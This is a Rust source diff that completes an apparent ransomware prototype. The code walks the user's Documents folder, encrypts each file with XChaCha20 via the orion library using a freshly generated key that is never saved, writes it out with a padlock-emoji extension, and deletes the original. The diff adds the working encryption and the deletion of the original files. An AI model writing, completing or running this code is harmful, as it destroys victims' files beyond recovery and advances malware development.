@@ -1,7 +1,7 @@
-use dirs::home_dir;
 use std::fs;
 use std::path::PathBuf;
-use anyhow::Result;
+use anyhow::{Result, Ok};
+use orion::aead;
 
 const ENCRYPTED_EXTENSION:	&str	= ".🔒";
 
@@ -9,10 +9,11 @@ const ENCRYPTED_EXTENSION:	&str	= ".🔒";
 // current code isn't capable of encrypting giant files due
 // to having to load the whole file into memory
 
+
 fn main() -> Result<()> {
 	let target_dir = format!(
 		"{}\\Documents",
-		home_dir().unwrap_or("~".into()).to_string_lossy(),
+		dirs::home_dir().unwrap_or("~".into()).to_string_lossy(),
 	);
 
 	let entries = fs::read_dir(target_dir)?;
@@ -37,15 +38,22 @@ fn encrypt_file(path: PathBuf) -> Result<()> {
 
 		// Prepare new file data
 		let content = fs::read(&path)?;
-		let encrypted_data = encrypt_xchacha20(content);
+		let encrypted_data = encrypt_xchacha20(content)?;
 
 		// Write encrypted data to new file
 		fs::write(&encrypted_path, &encrypted_data[..])?;
+		fs::remove_file(&path)?;
 	}
 
 	Ok(())
 }
 
-fn encrypt_xchacha20(_src: Vec<u8>) -> Vec<u8> {
-	todo!()
+fn encrypt_xchacha20(src: Vec<u8>) -> Result<Vec<u8>> {
+	// check this: https://docs.rs/orion/latest/orion/aead/index.html
+
+	let secret_key = aead::SecretKey::default();
+	let ciphertext = aead::seal(&secret_key, &src[..])?;
+	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
+
+	Ok(ciphertext)
 }
